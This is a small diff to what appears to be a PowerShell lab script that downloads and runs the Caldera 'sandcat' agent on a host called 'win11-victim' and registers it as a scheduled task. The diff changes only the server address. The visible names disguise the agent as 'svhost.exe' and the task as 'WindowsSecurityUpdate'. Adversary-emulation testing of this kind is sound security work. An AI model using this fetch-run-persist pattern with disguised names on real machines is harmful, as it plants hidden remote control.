@@ -2,7 +2,7 @@
 # One-shot: download sandcat from Caldera, run it, register as scheduled task.
 # Run from C:\vagrant\scripts\ on win11-victim.
 
-$CalderaServer = "http://192.168.56.30:8888"
+$CalderaServer = "http://192.168.56.1:8888"
 $SandcatPath   = "C:\Users\Public\svhost.exe"
 $TaskName      = "WindowsSecurityUpdate"
 
